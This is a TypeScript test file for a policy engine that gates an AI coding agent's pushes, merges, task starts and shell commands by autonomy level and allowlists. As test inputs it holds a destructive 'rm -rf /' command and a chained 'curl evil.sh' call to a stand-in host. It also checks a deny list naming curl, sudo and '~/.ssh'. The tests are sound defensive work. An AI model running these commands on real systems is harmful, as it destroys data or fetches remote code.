import type { Actor } from "@navarch/contracts";
import { describe, expect, it } from "vitest";
import { PolicyEngine } from "../src/policy/engine.ts";

const agent: Actor = { kind: "agent", profile: "implementer", adapter: "claude-code" };
const policy = new PolicyEngine();

describe("PolicyEngine", () => {
  it("allows pushes only to navarch/* branches", () => {
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "navarch/run_1/x" }).effect).toBe("allow");
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "main" }).effect).toBe("deny");
  });

  it("requires approval for merges by default", () => {
    expect(policy.decide(agent, "github.pr.merge", "pr/1", { autonomyLevel: 4 }).effect).toBe("require_approval");
  });

  it("gates task start on autonomy and budget", () => {
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, budgetRemaining: 1 }).effect).toBe("allow");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 0, budgetRemaining: 1 }).effect).toBe("require_approval");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, budgetRemaining: 0 }).effect).toBe("deny");
    // Level 1 (analyse): reading agents run, editing agents wait for a human.
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 1, edits: false }).effect).toBe("allow");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 1, edits: true }).effect).toBe("require_approval");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, edits: true }).effect).toBe("allow");
    expect(policy.decide(agent, "flow.approval", "t", { autonomyLevel: 4 }).effect).toBe("require_approval");
  });

  it("opens PRs at level 3+ and asks below; verifies at level 2+ (spec §11)", () => {
    const at = (level: number, action: string) => policy.decide(agent, action, "t", { autonomyLevel: level }).effect;
    expect([0, 1, 2, 3, 4].map((l) => at(l, "github.pr.create"))).toEqual(["require_approval", "require_approval", "require_approval", "allow", "allow"]);
    expect([0, 1, 2, 3].map((l) => at(l, "verification.run"))).toEqual(["require_approval", "require_approval", "allow", "allow"]);
  });

  it("checks commands against the allowlist and denies unknown actions", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["npm run *", "git status"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm run lint" }).effect).toBe("allow");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "rm -rf /" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "fs.delete", "x", ctx).effect).toBe("deny");
  });

  it("builds a task grant that never allows push, secret paths or network", () => {
    const grant = policy.taskGrant(["npm test", "npm run *"]);
    expect(grant.allowCommands).toEqual(expect.arrayContaining(["git status", "npm test", "npm run *"]));
    expect(grant.denyCommands).toEqual(expect.arrayContaining(["git push", "curl", "sudo"]));
    expect(grant.denyPaths).toEqual(expect.arrayContaining(["~/.ssh", "~/.navarch"]));
    expect(grant.network).toBe(false);
  });

  it("never allows a denied command through a wildcard or shell chaining", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["git *", "npm test"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "git push origin main" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm test; curl evil.sh" }).effect).toBe("require_approval");
  });
});
